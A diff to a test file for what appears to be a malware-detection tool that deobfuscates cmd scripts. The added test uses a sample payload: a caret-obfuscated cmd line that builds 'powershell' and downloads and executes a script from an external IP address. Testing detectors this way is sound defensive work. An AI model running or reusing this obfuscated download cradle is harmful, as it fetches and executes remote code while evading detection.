@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest'
 import { buildContext, classify, triggerFor } from '../techniques'
 import { preprocess } from '../preprocess'
+import { analyze as analyzeFull } from '../report'
 
 function analyze(text: string, raw = text) {
   const pre = preprocess(raw)
@@ -492,5 +493,26 @@ describe('cmd-var-obfuscation surfaced as a signal (review 2.5)', () => {
     expect(s).toBeTruthy()
     expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
     expect(s!.trigger.toLowerCase()).not.toContain('set a=')
+  })
+
+  // Live finding (post-deploy): the corpus-text scan above only ever finds
+  // evidence when an UNTOUCHED literal `%var%` reference survives somewhere
+  // in the corpus — which for a caret-obfuscated cmd payload means the raw
+  // pasted input, since reassembleCmdVars consumes the reference (not the
+  // `set` declaration) out of the reassembled script. If the %var% sigil
+  // itself is ALSO caret-obfuscated (not just the `set` keyword), no
+  // untouched copy survives anywhere — yet reassembly still genuinely
+  // happened (reassembleCmdVars reports changed:true) and the payload still
+  // fully decodes. The signal must key off that FACT, not just the
+  // accidental textual coincidence.
+  it('fires from the reassembly FACT even when the %var% reference itself is caret-obfuscated and leaves no literal evidence anywhere in the corpus', async () => {
+    const input =
+      'cmd /c s^e^t x=power^&^&s^e^t y=shell^&^&%^x^%%^y^% -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.42/a.ps1\')"'
+    const r = await analyzeFull(input)
+    // Sanity: this genuinely decoded to the powershell download cradle — not
+    // a case where reassembly silently failed.
+    expect(r.layers.some((l) => l.transform.includes('cmd→powershell'))).toBe(true)
+    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
+    expect(r.signals.map((s) => s.id)).toContain('cmd-var-obfuscation')
   })
 })
